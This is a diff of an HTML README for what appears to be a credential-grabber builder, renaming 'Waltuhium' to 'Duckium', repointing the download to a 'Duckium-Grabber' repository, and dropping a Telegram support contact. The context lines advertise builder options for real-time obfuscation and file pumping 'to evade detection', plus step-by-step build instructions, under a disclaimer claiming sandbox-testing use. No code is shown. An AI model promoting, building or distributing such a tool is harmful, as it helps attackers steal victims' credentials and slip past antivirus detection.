@@ -61,7 +61,7 @@
 
 <!-- Builder Settings Section -->
 <h2 id="builder-settings">Builder Settings 🔧</h2>
-<p>Waltuhium builder provides the following options:</p>
+<p>Duckium builder provides the following options:</p>
 <ul>
   <li>:twisted_rightwards_arrows: <strong>Realtime Obfuscation</strong> - Applies real-time obfuscation techniques.</li>
   <li>:floppy_disk: <strong>File Pumper</strong> (Optional) - Pump your file size to evade detection.</li>
@@ -72,12 +72,11 @@
 
 <!-- How to Build Section -->
 <h2 id="how-to-build">How to Build 🛠️</h2>
-<p>To set up Waltuhium, follow these steps:</p>
+<p>To set up Duckium, follow these steps:</p>
 <ol>
   <li>:arrow_down: Download and Install <a href="https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe">Python 3.11.0</a></li>
-  <li>:arrow_down: <a href="https://github.com/waltuhium23/waltuhium/archive/refs/heads/main.zip">Download Waltuhium</a></li>
-  <li>:arrow_down: <a href="https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file">Extract</a> the zip file.</li>
-  <li>:point_right: Navigate to the Waltuhium folder and double click <code>build.bat</code>.</li>
+  <li>:arrow_down: <a href="https://github.com/inlyduck/Duckium-Grabber.git">Download Duckium</a></li>
+  <li>:point_right: Navigate to the Duckium folder and double click <code>setup.bat</code>.</li>
   <li>:rocket: Follow the on-screen instructions to complete the setup.</li>
 </ol>
 <!-- Todo Section -->
@@ -91,10 +90,6 @@
 <!-- Disclaimer Section -->
 <h2 id="disclaimer">Disclaimer ⚠️</h2>
 <p>- This software was developed for personal training and sandbox testing. The developer of the software is not responsible in any way for its misuse. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.</p>
-
-<!-- Notes Section -->
-<h2 id="notes">Note's 📢</h2>
-<p>- If you have any issues or need support with this project, you can contact me via <a href="https://t.me/waltuhxd">Telegram</a>:speech_balloon:</p>
 
 <!-- Support the Project Section -->
 <h2 id="support-the-project">Support the Project</h2>
